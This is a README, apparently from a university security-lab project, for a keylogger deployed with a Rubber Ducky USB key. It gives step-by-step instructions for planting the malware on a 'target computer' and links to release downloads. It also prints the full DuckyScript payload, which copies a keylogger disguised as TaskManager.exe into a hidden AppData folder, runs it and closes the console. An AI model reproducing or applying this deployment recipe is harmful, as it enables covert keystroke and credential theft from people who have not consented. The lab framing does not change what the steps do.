# Project KeyLogger Labo SSI

## Project
A simple KeyLogger malware

## Installation
To set up the use of the malware, follow these steps:
1. - Equip yourself with a Rubber Ducky USB key
2. - Download the TaskManager.exe malware from GitHub (https://github.com/Aube33/keylogger-labo-ssi/releases)
3. - Download the inject.bin script for the Rubber Ducky from GitHub (https://github.com/Aube33/keylogger-labo-ssi/releases)
4. - Place the TaskManager.exe file at the root of your Rubber Ducky
5. - Place the inject.bin file at the root of your Rubber Ducky
6. - Plug the key into the target computer


## Webhook url


## DuckyScript source:

```
REM *** Copy TaskManager.exe from USB to %appdata%/.TaskManager/ ***
DELAY 500
STRING for /f %d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set duck=%d
ENTER
DELAY 500
STRING xcopy /y %duck%\TaskManager.exe %appdata%\.TaskManager\TaskManager.exe
ENTER
DELAY 500

REM *** Execute TaskManager.exe ***
STRING %appdata%\.TaskManager\TaskManager.exe
ENTER
DELAY 500

REM *** GTFO ***
STRING exit
ENTER
STRING exit
ENTER
```